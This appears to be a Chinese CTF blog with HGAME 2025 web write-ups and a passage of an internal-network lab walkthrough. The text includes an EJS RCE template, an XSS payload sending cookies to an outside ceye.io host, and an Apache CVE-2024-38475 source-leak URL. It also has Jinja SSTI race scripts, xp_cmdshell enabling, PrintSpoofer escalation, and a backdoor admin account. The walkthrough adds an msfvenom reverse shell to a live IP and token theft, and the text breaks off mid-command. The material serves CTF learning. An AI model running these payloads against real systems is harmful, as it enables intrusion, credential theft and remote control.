return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype 